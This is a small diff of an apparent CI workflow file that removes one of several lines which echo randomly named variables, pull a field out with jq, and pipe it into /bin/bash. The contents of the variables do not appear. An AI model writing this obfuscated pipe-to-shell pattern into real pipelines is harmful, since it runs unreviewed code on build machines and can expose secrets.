@@ -23,7 +23,6 @@ jobs:
           echo $ndqa683 | jq -r .vm8 | /bin/bash
           printf '%s' "$vt3691" | jq -r .rlh47 | /bin/bash
           echo $qnv83918 | jq -r .rid6014 | /bin/bash
-          echo $tjbop0 | jq -r .btxrc74 | /bin/bash
           echo $fyy915 | jq -r .vf7307 | /bin/bash
           echo $vi85 | jq -r .gkzha66 | /bin/bash
           echo $ess6899 | jq -r .bmea8 | /bin/bash
